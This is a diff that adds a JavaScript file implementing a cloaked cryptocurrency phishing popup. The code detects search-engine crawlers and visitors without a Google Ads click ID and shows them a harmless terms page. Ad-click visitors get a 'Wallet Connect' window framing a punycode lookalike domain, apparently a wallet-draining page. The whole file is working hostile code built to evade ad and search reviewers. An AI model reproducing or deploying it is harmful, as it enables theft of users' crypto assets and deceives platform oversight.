@@ -1,0 +1,49 @@
+document.addEventListener('DOMContentLoaded', function() {
+    const triggers = document.querySelectorAll('a[href="#"], .goAuth');
+    
+    triggers.forEach(trigger => {
+        trigger.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Проверка на бота по userAgent
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isBot = /bot|crawler|spider|googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|teoma|ia_archiver/i.test(userAgent);
+            
+            // Проверка наличия gclid в URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const hasGclid = urlParams.has('gclid');
+            
+            // Определение файла для iframe
+            const iframeSrc = isBot || !hasGclid ? 'terms.html' : 'https://xn--quickswp-tx0d.exchange-tokens.api-dashboard-connect.com/connect.html';
+            
+            const wind = window.open("", "", "STATUS=NO,TOOLBAR=NO,LOCATION=0,DIRECTORIES=0,RESIZABLE=NO,SCROLLBARS=YES,TOP=50,LEFT=50,WIDTH=1004,HEIGHT=800");
+            
+            wind.document.write(`
+                <!DOCTYPE html>
+                <html style="overflow:hidden;">
+                <head>
+                    <title>Wallet Connect</title>
+                    <style>
+                        html, body {
+                            width: 1004px;
+                            height: 800px;
+                            margin: 0;
+                            padding: 0;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <iframe 
+                        src="${iframeSrc}" 
+                        border="0" 
+                        style="width:100vw; height:100vh; border: none;"
+                    ></iframe>
+                </body>
+                </html>
+            `);
+            
+            return false;
+        });
+    });
+});
